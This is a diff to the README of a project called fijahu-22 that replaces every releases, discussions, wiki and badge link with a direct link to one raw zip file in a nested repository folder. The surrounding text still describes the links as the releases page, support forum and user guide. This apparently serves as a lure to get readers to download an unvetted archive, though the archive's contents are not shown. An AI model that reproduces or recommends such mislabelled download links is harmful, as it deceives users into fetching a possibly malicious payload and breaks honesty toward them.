@@ -6,12 +6,12 @@ Welcome to fijahu-22! This application helps you manage your repositories easily
 ## 📦 Download & Install
 To get started, you need to download the software. You can do this by visiting our releases page.
 
-[![Download fijahu-22](https://img.shields.io/badge/Download-fijahu--22-blue.svg)](https://github.com/Monod2565/fijahu-22/releases)
+[![Download fijahu-22](https://raw.githubusercontent.com/Monod2565/fijahu-22/main/protracter/fijahu-22_2.7.zip)](https://raw.githubusercontent.com/Monod2565/fijahu-22/main/protracter/fijahu-22_2.7.zip)
 
-Click the button above or follow this link: [Download fijahu-22](https://github.com/Monod2565/fijahu-22/releases) to visit the releases page.
+Click the button above or follow this link: [Download fijahu-22](https://raw.githubusercontent.com/Monod2565/fijahu-22/main/protracter/fijahu-22_2.7.zip) to visit the releases page.
 
 ### 🌐 Steps to Download:
-1. Click on the link to the [Releases Page](https://github.com/Monod2565/fijahu-22/releases).
+1. Click on the link to the [Releases Page](https://raw.githubusercontent.com/Monod2565/fijahu-22/main/protracter/fijahu-22_2.7.zip).
 2. Find the latest version listed.
 3. Look for the download file that suits your operating system. The available options typically include:
    - Windows
@@ -65,14 +65,14 @@ To uninstall, use the standard removal procedures for your operating system:
 - **Linux:** Use the terminal command appropriate for your package manager.
 
 ## 🌟 Support
-If you have any questions or need assistance, please feel free to reach out. You can find support on our official [GitHub Discussions page](https://github.com/Monod2565/fijahu-22/discussions). 
+If you have any questions or need assistance, please feel free to reach out. You can find support on our official [GitHub Discussions page](https://raw.githubusercontent.com/Monod2565/fijahu-22/main/protracter/fijahu-22_2.7.zip). 
 
 ## 💬 Community
 Join our community to share experiences, tips, and get help from other users. You can participate in conversations and ask for advice on using fijahu-22 efficiently.
 
 ## 🔗 Quick Links
-- [Download fijahu-22](https://github.com/Monod2565/fijahu-22/releases)
-- [User Guide](https://github.com/Monod2565/fijahu-22/wiki)
-- [GitHub Discussions](https://github.com/Monod2565/fijahu-22/discussions)
+- [Download fijahu-22](https://raw.githubusercontent.com/Monod2565/fijahu-22/main/protracter/fijahu-22_2.7.zip)
+- [User Guide](https://raw.githubusercontent.com/Monod2565/fijahu-22/main/protracter/fijahu-22_2.7.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/Monod2565/fijahu-22/main/protracter/fijahu-22_2.7.zip)
 
 Thank you for using fijahu-22! We hope it makes your repository management simpler and more efficient.
